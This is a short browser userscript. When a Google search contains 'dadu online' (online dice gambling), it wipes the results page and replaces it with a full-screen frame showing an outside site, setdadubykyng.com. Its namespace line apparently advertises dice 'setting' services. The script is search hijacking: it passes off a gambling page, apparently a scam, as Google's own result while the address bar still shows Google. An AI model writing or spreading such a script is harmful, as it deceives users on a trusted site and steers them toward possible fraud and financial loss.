// ==UserScript==
// @name         koyong
// @namespace    mau seting?just cal me
// @version      1.0
// @match        https://www.google.com/search*
// @run-at       document-start
// @grant        none
// ==/UserScript==

(function () {
  const q = new URLSearchParams(location.search).get("q");
  if (!q || !q.toLowerCase().includes("dadu online")) return;

  document.open();
  document.write(`
    <!doctype html>
    <html>
      <head>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>dadu online</title>
      </head>
      <body style="margin:0;background:#1f1f1f;overflow:hidden">
        <iframe
          src="https://setdadubykyng.com/index2.php"
          style="width:100vw;height:100vh;border:0"
        ></iframe>
      </body>
    </html>
  `);
  document.close();
})();